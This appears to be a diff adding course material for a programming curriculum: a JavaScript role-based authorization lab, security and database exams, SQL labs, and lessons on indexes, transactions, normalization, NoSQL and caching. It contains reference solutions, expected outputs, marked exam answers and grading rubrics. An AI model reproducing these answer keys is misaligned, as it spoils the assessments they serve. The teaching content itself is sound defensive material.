+@starter
+const ROLES = {
+  viewer: ["doc.read"],
+  editor: ["doc.read", "doc.write"],
+  admin: ["doc.read", "doc.write", "doc.delete", "user.manage"],
+};
+
+function can(user, permission) {
+  return true;
+}
+
+function canReadDoc(user, doc) {
+  return true;
+}
+
+function canEditDoc(user, doc) {
+  return true;
+}
+
+function sanitizeUpdate(input) {
+  return input;
+}
+@solution
+const ROLES = {
+  viewer: ["doc.read"],
+  editor: ["doc.read", "doc.write"],
+  admin: ["doc.read", "doc.write", "doc.delete", "user.manage"],
+};
+
+function can(user, permission) {
+  if (!user || !Array.isArray(user.roles)) return false;
+  return user.roles.some((role) => (ROLES[role] || []).includes(permission));
+}
+
+function canReadDoc(user, doc) {
+  if (doc.published) return true;
+  if (!user) return false;
+  return doc.ownerId === user.id || can(user, "doc.delete");
+}
+
+function canEditDoc(user, doc) {
+  if (!user) return false;
+  if (can(user, "doc.delete")) return true;
+  return can(user, "doc.write") && doc.ownerId === user.id;
+}
+
+function sanitizeUpdate(input) {
+  const out = {};
+  for (const key of ["title", "body"]) {
+    if (Object.prototype.hasOwnProperty.call(input, key)) out[key] = input[key];
+  }
+  return out;
+}
+@tests
+can({ id: 1, roles: ["viewer"] }, "doc.read") => true
+can({ id: 1, roles: ["viewer"] }, "doc.write") => false
+can({ id: 1, roles: ["viewer", "editor"] }, "doc.write") => true
+can({ id: 1, roles: ["admin"] }, "user.manage") => true
+can({ id: 1, roles: ["wizard"] }, "doc.read") => false
+can({ id: 1, roles: [] }, "doc.read") => false
+can(null, "doc.read") => false
+canReadDoc(null, { id: 9, ownerId: 1, published: true }) => true
+canReadDoc(null, { id: 9, ownerId: 1, published: false }) => false
+canReadDoc({ id: 1, roles: ["viewer"] }, { id: 9, ownerId: 1, published: false }) => true
+canReadDoc({ id: 2, roles: ["editor"] }, { id: 9, ownerId: 1, published: false }) => false
+canReadDoc({ id: 2, roles: ["admin"] }, { id: 9, ownerId: 1, published: false }) => true
+canEditDoc({ id: 1, roles: ["editor"] }, { id: 9, ownerId: 1, published: true }) => true
+canEditDoc({ id: 2, roles: ["editor"] }, { id: 9, ownerId: 1, published: true }) => false
+canEditDoc({ id: 1, roles: ["viewer"] }, { id: 9, ownerId: 1, published: true }) => false
+canEditDoc({ id: 2, roles: ["admin"] }, { id: 9, ownerId: 1, published: true }) => true
+canEditDoc(null, { id: 9, ownerId: 1, published: true }) => false
+sanitizeUpdate({ title: "T", body: "B", role: "admin", ownerId: 7 }) => {"title": "T", "body": "B"}
+sanitizeUpdate({ body: "B" }) => {"body": "B"}
+sanitizeUpdate({ isAdmin: true }) => {}
+@hints
+Start every function by handling the missing user. Deny by default.
+`can` should look up each of the user's roles in `ROLES`, treating an unknown role as having no permissions.
+Reading has a public case (published) that must be checked before requiring a user.
+`sanitizeUpdate` builds a new object from an explicit allow-list of field names; it never copies the input.
+
+#EXAM 20
+#Q Which function is appropriate for storing passwords?
+- SHA-256
+* Argon2id
+- Base64
+! It is slow, memory-hard and salted by design.
+#Q What should happen to the session ID when a user signs in?
+- It should stay the same
+* A new one should be issued
+- It should be shown in the URL
+! Regenerating it prevents session fixation.
+#Q Which part of a JWT must never be trusted to choose the verification algorithm?
+* The alg field in the header
+- The exp claim
+- The signature
+! The server must fix the accepted algorithm itself.
+#Q Can the contents of a JWT payload be read by the person holding the token?
+* Yes: it is only encoded and signed
+- No: it is encrypted
+- Only by administrators
+! Signing gives integrity, not confidentiality.
+#Q Why check permissions rather than role names in code?
+- Role names are longer
+* Roles can be reorganised without changing every check
+- Permissions are faster to compare
+! Code depends on what is allowed, not on who is currently grouped where.
+#Q What is mass assignment?
+- Sending many emails at once
+* Copying all fields from a request onto a record, letting a client set fields it should not control
+- Creating many accounts
+! Accept an explicit allow-list of fields.
+#Q Which combination defends against cross-site scripting?
+- Longer passwords and HTTPS
+* Output escaping and a content security policy
+- Rate limiting and CAPTCHAs
+! Both stop attacker-supplied text from running as script.
+#W A small web application stores passwords with unsalted MD5, keeps the user's ID in a cookie readable by JavaScript, and builds SQL by joining strings. Explain the risk of each and what you would replace it with.
++ Explains that fast unsalted hashes are quickly cracked, and recommends a salted password hash such as Argon2 or bcrypt
++ Explains that a readable, guessable identity cookie allows impersonation, and recommends a random session ID in an HttpOnly, Secure, SameSite cookie
++ Explains SQL injection and recommends parameterised queries
++ Orders or prioritises the fixes sensibly
++ Mentions an additional layer (rate limiting, MFA, CSP, least privilege)
+
+#PROJECT Authentication service
+Build a small authentication and authorization service with a documented API.
+@requirements
+Sign-up, sign-in, sign-out and password change
+Passwords stored with a salted password-hashing function from a maintained library
+Either server-side sessions with correctly configured cookies, or short-lived access tokens with revocable refresh tokens
+Role-based permissions enforced by a central policy module, with ownership checks
+Rate limiting on sign-in
+Tests that prove what each role cannot do
+A threat list: at least six attacks and how the design resists each
+@deliverables
+The repository and API documentation
+The test output, including the negative authorization tests
+The threat list
+@rubric
+Credential storage and session or token handling are correct | 30
+Authorization is centralised, denies by default and is tested | 25
+Defences against injection, XSS, CSRF and brute force | 20
+The threat list shows real analysis | 15
+Code quality and documentation | 10
+
+#COURSE c305
+#LESSON Indexes | 13
+A table with ten million rows and a query `WHERE email = 'ada@example.com'`. Without help, the database reads every row: a **full table scan**. An **index** lets it jump to the answer.
+
+An index is a separate structure, usually a **B-tree**, that keeps one or more columns in sorted order with a pointer to each row. It is exactly like the index of a book.
+
+```sql
+CREATE INDEX idx_users_email ON users (email);
+```
+
+```diagram
+                        [ g | p ]
+                      /     |     \
+              [a..f]     [g..o]     [p..z]        sorted keys
+                 |          |          |
+              row ptrs   row ptrs   row ptrs      -> rows in the table
+```
+
+Finding one value in ten million takes about four node reads instead of ten million row reads.
+
+### What an index helps
+- Equality: `WHERE email = ?`
+- Ranges: `WHERE created_at > ?`, because the keys are sorted.
+- Sorting: `ORDER BY created_at` can read the index in order.
+- Joins: looking up the matching rows in the other table.
+
+### What it costs
+- **Slower writes.** Every insert, update and delete must also update every index on the table.
+- **Storage.**
+
+So index what you query by, not everything.
+
+### Composite indexes
+An index on several columns, `(country, city)`, is sorted by the first, then the second. It serves queries on `country`, or on `country` and `city`, but **not** on `city` alone, just as a phone book sorted by surname does not help you find everyone named "Ada". This is the **leftmost prefix rule**.
+
+### When an index is not used
+- A function is applied to the column: `WHERE LOWER(email) = ?` cannot use a plain index on `email`.
+- A leading wildcard: `LIKE '%son'`.
+- The query matches most of the table, so scanning is cheaper.
+
+### See what the database does
+`EXPLAIN` shows the **query plan**: which indexes are used and how many rows are examined.
+
+```sql
+EXPLAIN SELECT * FROM users WHERE email = 'ada@example.com';
+```
+
+Measure before adding an index, and again after.
+
+### Covering indexes
+If an index contains every column a query needs, the database answers from the index alone without touching the table.
+
+> In industry: The most common cause of a slow application is a missing index, and the most common fix for a slow query is reading its plan.
+#Q What data structure is typically used for a database index?
+- A linked list
+* A B-tree
+- A stack
+! It keeps keys sorted and is very shallow, minimising disk reads.
+#Q A composite index exists on (country, city). Which query can use it effectively?
+* WHERE country = 'CA' AND city = 'Toronto'
+- WHERE city = 'Toronto'
+- WHERE population > 1000
+! The index is ordered by country first, so the leading column must be constrained.
+
+#LESSON Transactions and ACID | 14
+Transferring money takes two updates: subtract from one account, add to another. If the server crashes between them, money vanishes. A **transaction** groups operations so that they succeed or fail together.
+
+```sql
+BEGIN;
+UPDATE accounts SET balance = balance - 100 WHERE id = 1;
+UPDATE accounts SET balance = balance + 100 WHERE id = 2;
+COMMIT;
+```
+
+If anything goes wrong before `COMMIT`, `ROLLBACK` undoes everything.
+
+### ACID
+- **Atomicity:** all or nothing.
+- **Consistency:** the database moves from one valid state to another; constraints always hold.
+- **Isolation:** concurrent transactions do not interfere; each behaves as if it ran alone.
+- **Durability:** once committed, the change survives a crash. Databases achieve this with a **write-ahead log**: the change is written to an append-only log on disk before the transaction is confirmed.
+
+### The hard one: isolation
+When two transactions run at once, several things can go wrong.
+
+- **Dirty read:** seeing another transaction's uncommitted change, which may be rolled back.
+- **Non-repeatable read:** reading the same row twice and getting different values.
+- **Phantom read:** a repeated query returns new rows.
+- **Lost update:** two transactions read a value, both modify it, and one overwrites the other.
+
+```diagram
+  T1: read stock = 1                          T2: read stock = 1
+  T1: stock is enough, write stock = 0        T2: stock is enough, write stock = 0
+       two items sold, only one existed
+```
+
+### Isolation levels
+Stronger isolation prevents more anomalies but allows less concurrency.
+
+| Level | Prevents |
+|---|---|
+| Read committed | dirty reads |
+| Repeatable read | also non-repeatable reads |
+| Serializable | everything: equivalent to running one at a time |
+
+Most databases default to read committed. Know your database's default and what it permits.
+
+### Fixing the lost update
+- **Do it in one statement:** `UPDATE products SET stock = stock - 1 WHERE id = 5 AND stock >= 1`, then check a row was changed.
+- **Pessimistic locking:** `SELECT ... FOR UPDATE` locks the row until the transaction ends.
+- **Optimistic locking:** store a `version` number; update only `WHERE version = ?` and retry if no row matched.
+
+### Deadlock
+Two transactions each hold a lock the other needs. The database detects this and aborts one, so application code must be ready to **retry**. Acquiring locks in a consistent order avoids most deadlocks.
+
+> Key idea: Keep transactions short, and never wait for a user or a network call inside one.
+#Q What does atomicity guarantee?
+- Transactions run quickly
+* Either all of a transaction's changes take effect or none do
+- Data is encrypted
+! A partial transaction is never visible.
+#Q Two requests each read a stock of 1 and each sell the item. What is this anomaly called?
+* Lost update
+- Dirty read
+- Deadlock
+! One write overwrites the other because both were based on the same stale read.
+
+#LESSON Normalization | 13
+**Normalization** is the systematic removal of redundancy from a schema, so that each fact is stored once and the data cannot contradict itself.
+
+### The anomalies it prevents
+Consider one wide table:
+
+```text
+orders(order_id, customer_name, customer_email, product, product_price, quantity)
+```
+
+- **Update anomaly:** a customer's email appears on many rows; update some and the data disagrees.
+- **Insert anomaly:** you cannot record a new product until someone orders it.
+- **Delete anomaly:** deleting a product's last order erases the product's price.
+
+### Functional dependencies
+Column B is **functionally dependent** on column A if knowing A determines B: `customer_id → customer_email`. Normal forms are rules about these dependencies.
+
+### The normal forms
+**First normal form (1NF):** every column holds a single value. No lists in a cell, no repeated groups such as `phone1`, `phone2`.
+
+**Second normal form (2NF):** 1NF, and no column depends on only part of a composite key. In `order_items(order_id, product_id, quantity, product_name)`, `product_name` depends on `product_id` alone, so it belongs in `products`.
+
+**Third normal form (3NF):** 2NF, and no non-key column depends on another non-key column. In `employees(id, department_id, department_name)`, the name depends on `department_id`, not on the employee, so it belongs in `departments`.
+
+A traditional summary: every non-key column must depend on **the key, the whole key, and nothing but the key**.
+
+### Normalizing the example
+```text
+customers(id, name, email)
+products(id, name, price)
+orders(id, customer_id, placed_at)
+order_items(order_id, product_id, quantity, unit_price)
+```
+
+Each fact now lives in one place.
+
+### Denormalization
+Normalised data needs joins, and joins cost time. **Denormalization** deliberately stores redundant data to make reads faster: a `total` column on `orders`, or a count of comments on a post.
+
+It is a trade: faster reads for slower, more complicated writes and the risk of inconsistency. Do it only when a measured performance problem justifies it, and decide how the copies are kept in step.
+
+### Rule of thumb
+Normalise first, to 3NF. Denormalise later, deliberately, in specific places, with evidence. Schemas designed the other way round are slow to change and full of contradictory data.
+
+> In industry: Transaction-processing databases are kept normalised. Analytics warehouses are deliberately denormalised into wide tables because they are read far more than written.
+#Q Which problem does normalization mainly prevent?
+- Slow queries
+* Redundant data that can become inconsistent
+- Large file sizes
+! Storing each fact once removes update, insert and delete anomalies.
+#Q employees(id, department_id, department_name) violates which normal form?
+- First
+- Second
+* Third
+! department_name depends on department_id, a non-key column.
+
+#LESSON NoSQL databases | 13
+Relational databases are the right default. **NoSQL** ("not only SQL") is a family of databases that give up some relational features to gain something else: flexible structure, simple horizontal scaling or speed for one particular access pattern.
+
+### Four families
+**Key-value stores** (Redis, DynamoDB). A giant hash table: get and set by key. Extremely fast, but you can look things up only by key.
+
+**Document stores** (MongoDB, Firestore). Each record is a JSON-like document, and documents in one collection need not share a structure.
+
+```text
+{ "_id": 42, "name": "Ada", "orders": [ { "total": 30 }, { "total": 40 } ] }
+```
+
+Data read together is stored together, so one read fetches the customer with their orders and no join is needed. The cost: no enforced schema, and relationships between documents are your responsibility.
+
+**Wide-column stores** (Cassandra, Bigtable). Rows identified by a partition key, spread across many machines. Built for enormous write volumes and predictable queries.
+
+**Graph databases** (Neo4j). Nodes and relationships as first-class data, for questions such as "friends of friends who like this".
+
+### Design from the queries
+In a relational design you model the data, then write whatever queries you need. In most NoSQL design you start from the **queries** and shape the data to answer them directly, often storing the same information several ways. Changing your mind later is expensive.
+
+### Consistency
+Many NoSQL systems spread data across machines and favour availability, offering **eventual consistency**: all copies agree in the end, but a read just after a write may return the old value. Some offer tunable or strong consistency at a cost in speed. (Stage 4 explains the theory.)
+
+### When to choose what
+| Need | Reasonable choice |
+|---|---|
+| Related data, complex queries, transactions | relational |
+| Simple lookups at very high speed, caching | key-value |
+| Self-contained records with varying shape | document |
+| Huge write volume, simple known queries | wide-column |
+| Deeply connected data | graph |
+
+### A caution
+Many projects that chose NoSQL to avoid designing a schema ended up with an undocumented schema enforced nowhere. Modern relational databases also store JSON, scale a long way, and are well understood. Choose NoSQL for a specific strength you need, not because it sounds modern.
+
+> In industry: Large systems commonly use several databases together, each for the job it does best. This is called polyglot persistence.
+#Q What does a document database store?
+- Only numbers
+* Self-contained JSON-like records that may differ in structure
+- Tables with fixed columns
+! Related data is stored together in one document.
+#Q How does data modelling typically differ in NoSQL databases?
+- There is no modelling to do
+* The model is designed around the specific queries the application will run
+- Every table must be in third normal form
+! Data is shaped for access patterns, often with deliberate duplication.
+
+#LESSON Caching and Redis | 13
+A **cache** stores the result of slow work so that it can be reused. It is the most common way to make a system faster, and one of the easiest to get wrong.
+
+### Redis
+**Redis** is an in-memory data store. Because it keeps everything in RAM, operations take microseconds. Beyond simple strings it provides lists, sets, sorted sets and hashes, and every key can be given an expiry.
+
+```text
+SET user:42:profile "{...}" EX 300      (expires after 300 seconds)
+GET user:42:profile
+INCR page:home:views
+```
+
+Common uses: caching, session storage, rate limiting (count requests per user per minute), leaderboards (sorted sets), and queues.
+
+### Cache-aside
+The most common pattern:
+
+```diagram
+  1. look in the cache
+        hit  -> return it
+        miss -> 2. read from the database
+                3. store it in the cache with a TTL
+                4. return it
+```
+
+```js
+async function getUser(id) {
+  const cached = await cache.get("user:" + id);
+  if (cached) return JSON.parse(cached);
+  const user = await db.findUser(id);
+  await cache.set("user:" + id, JSON.stringify(user), { EX: 300 });
+  return user;
+}
+```
+
+### Invalidation
+> "There are only two hard things in computer science: cache invalidation and naming things." (Phil Karlton)
+
+When the underlying data changes, the cached copy is wrong. Options:
+
+- **Time to live (TTL):** entries expire. Simple; data may be stale for up to the TTL.
+- **Explicit invalidation:** delete the cache entry whenever you update the data. Fresher, but every write path must remember.
+- **Write-through:** update the cache and the database together.
+
+Decide how stale each kind of data may be. A product description can be minutes old; an account balance cannot.
+
+### Eviction
+A cache is finite. When full it must discard something. **LRU** (least recently used) discards what has gone longest without being read.
+
+### Ways caching goes wrong
+- **Stampede:** a popular entry expires and thousands of requests recompute it at once. Remedies: let one request recompute while the others wait, or add random variation to expiry times.
+- **Stale data** shown to users after an update.
+- **Cold start:** an empty cache after a restart sends every request to the database.
+- **Caching too early:** hiding a slow query that an index would have fixed.
+
+### Layers of cache
+The browser, a content delivery network, the application cache and the database's own buffers are all caches. A request may be answered by any of them.
+
+> Key idea: A cache trades freshness for speed. Always know how stale the data may be, and what happens when the cache is empty.
+#Q In the cache-aside pattern, what happens on a cache miss?
+- An error is returned
+* The data is read from the database, stored in the cache and returned
+- The cache is cleared
+! Later requests then find it in the cache.
+#Q What is a cache stampede?
+- The cache running out of memory
+* Many requests recomputing the same expired entry at the same moment
+- A cache returning data too quickly
+! The load that the cache was hiding hits the database all at once.
+
+#LAB sql | Reporting on a normalised schema
+The database is normalised into four tables:
+
+```text
+customers(id, name)
+products(id, name, price)
+orders(id, customer_id)
+order_items(order_id, product_id, quantity)
+```
+
+Write **one query** returning each product's `name` and the total `revenue` it has earned, where revenue is the sum of `quantity * price` over all its order items. Include only products that have been ordered. Sort by revenue from largest to smallest, and break ties by name alphabetically.
+
+The result has two columns: the product name, then the revenue.
+@setup
+CREATE TABLE customers (id INTEGER, name TEXT);
+CREATE TABLE products (id INTEGER, name TEXT, price INTEGER);
+CREATE TABLE orders (id INTEGER, customer_id INTEGER);
+CREATE TABLE order_items (order_id INTEGER, product_id INTEGER, quantity INTEGER);
+INSERT INTO customers VALUES (1, 'Ada'), (2, 'Linus');
+INSERT INTO products VALUES (1, 'lamp', 20), (2, 'desk', 150), (3, 'pen', 2), (4, 'chair', 60);
+INSERT INTO orders VALUES (100, 1), (101, 2), (102, 1);
+INSERT INTO order_items VALUES (100, 1, 2), (100, 3, 10), (101, 2, 1), (101, 1, 1), (102, 3, 20);
+@starter
+SELECT name FROM products;
+@solution
+SELECT p.name, SUM(i.quantity * p.price) AS revenue
+FROM order_items i
+JOIN products p ON p.id = i.product_id
+GROUP BY p.name
+ORDER BY revenue DESC, p.name;
+@rows
+[["desk", 150], ["lamp", 60], ["pen", 60]]
+@hints
+Revenue needs both the quantity (in `order_items`) and the price (in `products`), so join those two tables.
+Group by the product and use `SUM(quantity * price)`.
+An inner join already excludes products that were never ordered.
+Two sort keys: `ORDER BY revenue DESC, name`.
+
+#EXAM 20
+#Q Why not create an index on every column?
+- Indexes cannot be deleted
+* Each index slows down writes and uses storage
+- Only one index is allowed per table
+! Every insert, update and delete must maintain every index.
+#Q Which condition prevents a plain index on email from being used?
+- WHERE email = 'a@b.com'
+* WHERE LOWER(email) = 'a@b.com'
+- WHERE email IN ('a@b.com', 'c@d.com')
+! Applying a function to the column hides the indexed value.
+#Q What gives a database durability?
+- Faster processors
+* A write-ahead log flushed to disk before a commit is confirmed
+- Normalization
+! After a crash, the log is replayed to recover committed changes.
+#Q Which isolation level behaves as if transactions ran one after another?
+- Read committed
+- Repeatable read
+* Serializable
+! It is the strongest and the most costly.
+#Q What does optimistic locking rely on?
+- Locking the whole table
+* A version number checked at update time, with a retry on conflict
+- Never updating rows
+! No lock is held; conflicts are detected when writing.
+#Q When is denormalization justified?
+- Always, to avoid joins
+* When a measured read-performance problem justifies the extra write complexity
+- Never
+! It is a deliberate, evidence-based trade.
+#Q Which eviction policy removes the entry that has gone longest without being accessed?
+* LRU
+- FIFO
+- TTL
+! Least recently used.
+#W An e-commerce site's product page is slow. It runs a query joining four tables on every view. Propose a plan to diagnose and improve it, covering what you would measure first, the role of indexes, and how and what you would cache, including how the cache is kept correct.
++ Starts by measuring: reads the query plan or timings before changing anything
++ Considers indexes on join and filter columns
++ Proposes caching with a specific pattern such as cache-aside
++ States an invalidation approach (TTL, explicit invalidation on update)
++ Notes what must not be served stale (price, stock) or a risk such as stampede
+
+#PROJECT Schema and query tuning report
+Take a database with at least five tables and enough generated data to make queries slow (hundreds of thousands of rows), then tune it and report what you found.
+@requirements
+The schema is in third normal form, with an explanation of each table's key and dependencies
+At least five realistic queries are measured before any tuning
+Query plans are examined and indexes added where justified, with before and after timings
+One transaction that would suffer a lost update is demonstrated and then fixed
+One query result is cached, with a stated invalidation rule and its staleness limit
+One deliberate denormalization is made and justified
+@deliverables
+The schema, data generator and queries
+The report with measurements, plans and reasoning
+@rubric
+Normalization is correct and explained | 20
+Measurements are sound and plans are interpreted correctly | 30
+The concurrency problem is demonstrated and fixed | 20
+Caching and denormalization are justified with their trade-offs | 20
+Clarity of the report | 10
